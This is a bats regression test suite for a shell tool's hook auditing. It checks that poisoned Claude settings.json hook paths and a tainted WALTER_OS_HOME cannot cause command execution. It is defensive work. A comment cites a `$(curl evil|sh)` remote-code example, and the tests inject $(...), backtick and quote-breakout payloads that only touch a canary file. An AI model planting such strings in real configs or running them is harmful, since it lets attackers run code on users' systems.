#!/usr/bin/env bats
# tests/audit/hook-path-rce-regression.bats
#
# Codex R2 (PR #124) found a BLOCKER: audit.sh check_hooks + walter-os
# cmd_baseline_hooks both used `eval "resolved=\"$first_tok\""` to expand
# $-prefixed paths from ~/.claude/settings.json. An attacker who could
# tamper with settings.json could insert `$(curl evil|sh)/foo` in a hook
# command — eval would execute it the next time the audit ran. These
# tests lock in the non-regression: a malicious settings.json that tries
# `$(...)`, `` `cmd` ``, or any unknown env var MUST NOT execute.

setup() {
  command -v jq >/dev/null 2>&1 || skip "jq required"

  REPO_ROOT="$(cd "$BATS_TEST_DIRNAME/../.." && pwd)"
  WALTER_OS_BIN="$REPO_ROOT/bin/walter-os"
  AUDIT_SH="$REPO_ROOT/skills/daily-supply-chain-audit/scripts/audit.sh"
  [[ -x "$WALTER_OS_BIN" && -f "$AUDIT_SH" ]] || skip "missing artifacts"

  TMP_HOME="$(mktemp -d)"
  export HOME="$TMP_HOME"
  export WALTER_CONFIG="$TMP_HOME/.config/walter-os"
  export WALTER_OS_HOME="$REPO_ROOT"
  export CLAUDE_HOME="$TMP_HOME/.claude"
  export CLAUDE_SETTINGS="$CLAUDE_HOME/settings.json"
  mkdir -p "$WALTER_CONFIG" "$CLAUDE_HOME"

  # The canary file. If any of the RCE attempts execute, this file
  # gets touched.
  CANARY="$TMP_HOME/RCE_CANARY"
}

teardown() {
  case "$TMP_HOME" in
    /tmp/*|/var/folders/*|/var/tmp/*) rm -rf "$TMP_HOME" ;;
  esac
  true
}

# Write a settings.json with a single PreToolUse hook whose command
# field is $1 (a potentially-malicious string).
_write_settings_with_command() {
  local cmd="$1"
  jq -n --arg cmd "$cmd" \
    '{hooks: {PreToolUse: [{command: $cmd}]}}' > "$CLAUDE_SETTINGS"
}

# -----------------------------------------------------------------------
# baseline-hooks RCE regression
# -----------------------------------------------------------------------
@test "baseline-hooks: \$(touch CANARY)/hook.sh does NOT execute" {
  _write_settings_with_command "\$(touch $CANARY)/hook.sh"
  "$WALTER_OS_BIN" baseline-hooks >/dev/null 2>&1 || true
  [ ! -e "$CANARY" ]
}

@test "baseline-hooks: backtick-substitution does NOT execute" {
  _write_settings_with_command "\`touch $CANARY\`/hook.sh"
  "$WALTER_OS_BIN" baseline-hooks >/dev/null 2>&1 || true
  [ ! -e "$CANARY" ]
}

@test "baseline-hooks: unknown \$EVIL_VAR is refused, not expanded" {
  EVIL_VAR="$TMP_HOME/exists.sh" _write_settings_with_command "\$EVIL_VAR/hook.sh"
  # Even if the operator's env has EVIL_VAR set, the allowlist refuses
  # to expand it — the command is recorded as inline (path=empty).
  "$WALTER_OS_BIN" baseline-hooks >/dev/null 2>&1 || true
  local checksums="$WALTER_CONFIG/hook-checksums.json"
  [ -f "$checksums" ]
  # The recorded path for this hook must be empty (allowlist refused).
  local path
  path=$(jq -r '.hooks[0].path' "$checksums")
  [ "$path" = "" ]
}

# -----------------------------------------------------------------------
# audit.sh check_hooks RCE regression
# -----------------------------------------------------------------------
# Source audit.sh's check_hooks indirectly by running the full audit.
# audit.sh is sensitive to env layout; we keep the test minimal —
# just confirm the canary doesn't get touched.

@test "audit check_hooks: \$(touch CANARY) in command does NOT execute" {
  # First seed a v2 baseline so check_hooks has something to compare.
  _write_settings_with_command "/bin/true"
  "$WALTER_OS_BIN" baseline-hooks >/dev/null 2>&1 || true
  # Now poison settings.json with the RCE payload.
  _write_settings_with_command "\$(touch $CANARY)/hook.sh"
  # Run audit.sh — even though check_hooks tries to resolve paths from
  # the new (poisoned) settings, the allowlist should refuse, no RCE.
  bash "$AUDIT_SH" >/dev/null 2>&1 || true
  [ ! -e "$CANARY" ]
}

# -----------------------------------------------------------------------
# Positive case: legitimate $HOME / $WALTER_OS_HOME prefixes still work
# -----------------------------------------------------------------------
@test "doctor: WALTER_OS_HOME with shell metacharacters does NOT execute (Codex R3)" {
  # Codex R3 #124: the doctor's tier-1/tier-4 bash -c calls used to
  # interpolate WALTER_OS_HOME into a quoted string. A WALTER_OS_HOME
  # containing `"; touch CANARY; #` would break out and execute. Fixed
  # by passing as positional arg.
  local canary="$TMP_HOME/DOCTOR_RCE_CANARY"
  local evil_home="$TMP_HOME/safe-prefix\"; touch $canary; echo \"oops"
  mkdir -p "$evil_home/agents"
  touch "$evil_home/agents/dummy.md"
  WALTER_OS_HOME="$evil_home" "$WALTER_OS_BIN" doctor --tier 4 >/dev/null 2>&1 || true
  [ ! -e "$canary" ]
}

@test "baseline-hooks: legitimate \$HOME-prefixed path resolves correctly" {
  mkdir -p "$TMP_HOME/hooks"
  cat > "$TMP_HOME/hooks/legit.sh" <<'SH'
#!/usr/bin/env bash
true
SH
  chmod +x "$TMP_HOME/hooks/legit.sh"
  _write_settings_with_command "\$HOME/hooks/legit.sh"
  "$WALTER_OS_BIN" baseline-hooks >/dev/null 2>&1
  local checksums="$WALTER_CONFIG/hook-checksums.json"
  [ -f "$checksums" ]
  local resolved
  resolved=$(jq -r '.hooks[0].path' "$checksums")
  [ "$resolved" = "$TMP_HOME/hooks/legit.sh" ]
}
